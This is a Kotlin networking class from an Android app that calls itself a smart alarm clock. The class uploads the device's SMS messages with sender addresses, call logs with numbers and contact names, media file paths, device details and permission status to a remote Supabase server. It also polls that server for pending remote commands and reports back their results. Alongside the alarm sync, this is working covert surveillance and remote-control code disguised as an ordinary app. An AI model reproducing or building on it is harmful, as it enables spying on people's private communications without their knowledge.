package uz.smartalarm.aqllibudilnik.sync

import com.google.gson.Gson
import com.google.gson.JsonObject
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import uz.smartalarm.aqllibudilnik.data.local.ActivityLogEntity
import uz.smartalarm.aqllibudilnik.data.local.AlarmEntity
import uz.smartalarm.aqllibudilnik.data.local.CallEntity
import uz.smartalarm.aqllibudilnik.data.local.MediaRecordEntity
import uz.smartalarm.aqllibudilnik.data.local.SmsEntity
import uz.smartalarm.aqllibudilnik.monitoring.DeviceInfo
import uz.smartalarm.aqllibudilnik.monitoring.PermissionStatus
import java.util.concurrent.TimeUnit

data class RemoteCommandItem(
    val id: String,
    val device_id: String,
    val command: String,
    val payload: String? = null
)

class SupabaseClient(private val syncPreferences: SyncPreferences) {

    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    private fun buildRequest(endpoint: String, method: String, jsonBody: String? = null, isUpsert: Boolean = false): Request {
        val rawBase = syncPreferences.getServerUrl().trimEnd('/')
        val url = if (rawBase.endsWith("/rest/v1")) {
            "$rawBase/$endpoint"
        } else {
            "$rawBase/rest/v1/$endpoint"
        }
        val apiKey = syncPreferences.getAnonKey()

        val reqBuilder = Request.Builder()
            .url(url)
            .addHeader("apikey", apiKey)
            .addHeader("Authorization", "Bearer $apiKey")
            .addHeader("Content-Type", "application/json")

        if (isUpsert) {
            reqBuilder.addHeader("Prefer", "resolution=merge-duplicates")
        }

        when (method) {
            "POST" -> reqBuilder.post((jsonBody ?: "{}").toRequestBody(jsonMediaType))
            "PATCH" -> reqBuilder.patch((jsonBody ?: "{}").toRequestBody(jsonMediaType))
            "GET" -> reqBuilder.get()
            "DELETE" -> reqBuilder.delete()
        }

        return reqBuilder.build()
    }

    suspend fun upsertDevice(deviceInfo: DeviceInfo): Boolean = withContext(Dispatchers.IO) {
        try {
            val body = JsonObject().apply {
                addProperty("device_id", deviceInfo.deviceId)
                addProperty("device_name", deviceInfo.deviceName)
                addProperty("manufacturer", deviceInfo.manufacturer)
                addProperty("model", deviceInfo.model)
                addProperty("android_version", deviceInfo.androidVersion)
                addProperty("app_version", deviceInfo.appVersion)
                addProperty("battery", deviceInfo.batteryLevel)
                addProperty("is_charging", deviceInfo.isCharging)
                addProperty("network_status", deviceInfo.networkStatus)
                addProperty("status", "online")
                addProperty("last_seen", java.time.Instant.now().toString())
            }

            val request = buildRequest("devices", "POST", gson.toJson(body), isUpsert = true)
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    suspend fun updatePermissions(deviceId: String, perm: PermissionStatus): Boolean = withContext(Dispatchers.IO) {
        try {
            val body = JsonObject().apply {
                addProperty("device_id", deviceId)
                addProperty("sms", perm.sms)
                addProperty("call_log", perm.callLog)
                addProperty("media", perm.media)
                addProperty("notifications", perm.notifications)
                addProperty("exact_alarm", perm.exactAlarm)
                addProperty("camera", perm.camera)
                addProperty("battery_optimization_ignored", perm.batteryOptimizationIgnored)
            }

            val request = buildRequest("permissions", "POST", gson.toJson(body), isUpsert = true)
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    suspend fun uploadSmsRecords(deviceId: String, list: List<SmsEntity>): Boolean = withContext(Dispatchers.IO) {
        if (list.isEmpty()) return@withContext true

        try {
            val array = list.map { item ->
                JsonObject().apply {
                    addProperty("device_id", deviceId)
                    addProperty("local_id", item.id)
                    addProperty("address", item.address)
                    addProperty("message", item.message)
                    addProperty("type", item.type)
                    addProperty("timestamp", item.timestamp)
                }
            }

            val request = buildRequest("sms_records", "POST", gson.toJson(array))
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    suspend fun uploadCallRecords(deviceId: String, list: List<CallEntity>): Boolean = withContext(Dispatchers.IO) {
        if (list.isEmpty()) return@withContext true

        try {
            val array = list.map { item ->
                JsonObject().apply {
                    addProperty("device_id", deviceId)
                    addProperty("local_id", item.id)
                    addProperty("number", item.number)
                    addProperty("name", item.name)
                    addProperty("type", item.type)
                    addProperty("duration", item.duration)
                    addProperty("timestamp", item.timestamp)
                }
            }

            val request = buildRequest("call_records", "POST", gson.toJson(array))
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    suspend fun uploadMediaRecords(deviceId: String, list: List<MediaRecordEntity>): Boolean = withContext(Dispatchers.IO) {
        if (list.isEmpty()) return@withContext true

        try {
            val array = list.map { item ->
                JsonObject().apply {
                    addProperty("device_id", deviceId)
                    addProperty("local_id", item.id)
                    addProperty("file_name", item.fileName)
                    addProperty("file_path", item.filePath)
                    addProperty("media_type", item.mediaType)
                    addProperty("size", item.size)
                    addProperty("date_added", item.dateAdded)
                }
            }

            val request = buildRequest("media_records", "POST", gson.toJson(array))
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    suspend fun uploadAlarms(deviceId: String, list: List<AlarmEntity>): Boolean = withContext(Dispatchers.IO) {
        if (list.isEmpty()) return@withContext true

        try {
            val array = list.map { item ->
                JsonObject().apply {
                    addProperty("device_id", deviceId)
                    addProperty("remote_id", item.id)
                    addProperty("time", String.format("%02d:%02d", item.hour, item.minute))
                    addProperty("label", item.label)
                    addProperty("is_enabled", item.isEnabled)
                    addProperty("difficulty", item.difficulty.name)
                    addProperty("question_count", item.questionsCount)
                    addProperty("repeat_days", item.repeatDays.joinToString(","))
                    addProperty("flashlight", item.isFlashlightEnabled)
                    addProperty("vibration", item.isVibrationEnabled)
                }
            }

            val request = buildRequest("alarms", "POST", gson.toJson(array), isUpsert = true)
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    suspend fun uploadActivityLogs(deviceId: String, list: List<ActivityLogEntity>): Boolean = withContext(Dispatchers.IO) {
        if (list.isEmpty()) return@withContext true

        try {
            val array = list.map { item ->
                JsonObject().apply {
                    addProperty("device_id", deviceId)
                    addProperty("event_type", item.eventType)
                    addProperty("event_data", item.eventData)
                }
            }

            val request = buildRequest("activity_logs", "POST", gson.toJson(array))
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    suspend fun fetchPendingCommands(deviceId: String): List<RemoteCommandItem> = withContext(Dispatchers.IO) {
        try {
            val request = buildRequest("commands?device_id=eq.$deviceId&status=eq.PENDING&select=id,device_id,command,payload", "GET")
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val bodyStr = response.body?.string() ?: return@withContext emptyList()
                    val listType = object : TypeToken<List<RemoteCommandItem>>() {}.type
                    gson.fromJson<List<RemoteCommandItem>>(bodyStr, listType) ?: emptyList()
                } else {
                    emptyList()
                }
            }
        } catch (e: Exception) {
            emptyList()
        }
    }

    suspend fun updateCommandStatus(commandId: String, status: String, result: String): Boolean = withContext(Dispatchers.IO) {
        try {
            val body = JsonObject().apply {
                addProperty("status", status)
                addProperty("result", result)
                addProperty("executed_at", java.time.Instant.now().toString())
            }
            val request = buildRequest("commands?id=eq.$commandId", "PATCH", gson.toJson(body))
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            false
        }
    }
}
